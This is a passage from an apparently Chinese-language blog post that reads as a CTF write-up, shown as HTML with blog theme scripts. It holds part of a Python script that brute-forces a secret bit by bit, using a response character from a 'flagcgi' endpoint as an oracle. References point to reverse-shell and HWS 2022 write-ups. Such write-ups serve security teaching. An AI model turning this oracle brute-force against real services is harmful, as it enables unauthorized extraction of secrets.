<span class="built_in">print</span>(<span class="string">&#x27;[*]fuck times: &#x27;</span> +<span class="built_in">str</span>(selectidx)) </span><br><span class="line">		recvdata = requests.post(flagcgi, headers = flagcgi_header, data = postdata) </span><br><span class="line">		<span class="comment">#print(&#x27;data: &#x27;+ recvdata.text)</span></span><br><span class="line">		idx = recvdata.text[<span class="number">77</span>:<span class="number">78</span>] </span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(idx) == fuckidx+<span class="number">2</span>: </span><br><span class="line">			secret += nowdata </span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[*]Success fuck&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## find second section </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------second section&#x27;</span>)</span><br><span class="line">secret += <span class="string">&#x27;01010&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> fuckidx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>): </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[*]fuck idx:&#x27;</span> + <span class="built_in">str</span>(fuckidx)) </span><br><span class="line">	<span class="keyword">for</span> selectidx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>): </span><br><span class="line">		postdata = secret </span><br><span class="line">		postdata += totl2[selectidx] </span><br><span class="line">		postdata += totl2[<span class="number">1</span>]*(<span class="number">5</span>-fuckidx)</span><br><span class="line">		postdata += <span class="string">&#x27;101&#x27;</span> </span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;[*]fuck times: &#x27;</span> + <span class="built_in">str</span>(selectidx)) </span><br><span class="line">		recvdata = requests.post(flagcgi, headers = flagcgi_header, data = postdata) </span><br><span class="line">		<span class="comment">#print(&#x27;data: &#x27; + recvdata.text)</span></span><br><span class="line">		idx = recvdata.text[<span class="number">77</span>:<span class="number">78</span>] </span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(idx) != fuckidx+<span class="number">2</span>+<span class="number">5</span>: </span><br><span class="line">			secret += totl2[selectidx] </span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[*] Success fuck&#x27;</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> recvdata.text: </span><br><span class="line">				<span class="built_in">print</span>(recvdata.text)</span><br><span class="line">			<span class="keyword">break</span> </span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://brucetg.github.io/2018/05/03/多种姿势反弹shell/">https://brucetg.github.io/2018/05/03/多种姿势反弹shell/</a></li>
+<li><a target="_blank" rel="noopener" href="https://x1ng.top/2022/01/25/HWS冬令营线上选拔赛2022/">https://x1ng.top/2022/01/25/HWS冬令营线上选拔赛2022/</a></li>
+<li><a target="_blank" rel="noopener" href="https://cjovi.icu/WP/1477.html">https://cjovi.icu/WP/1477.html</a></li>
+</ol>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/xxy1126.github.io/2022/03/31/%E6%A4%8D%E7%89%A9%E5%A4%A7%E6%88%98%E5%83%B5%E5%B0%B8CE-OD%E7%A0%B4%E8%A7%A3/">植物大战僵尸CE+OD破解<span class="note">较早</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+<p>本站由 <a href="https://www.tmotfl.top/xxy1126.github.io/">@1m0tfl</a> 创建，使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a> 作为主题。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/xxy1126.github.io/js/plugins/sites.js',
+    friendsjs: '/xxy1126.github.io/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/xxy1126.github.io/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
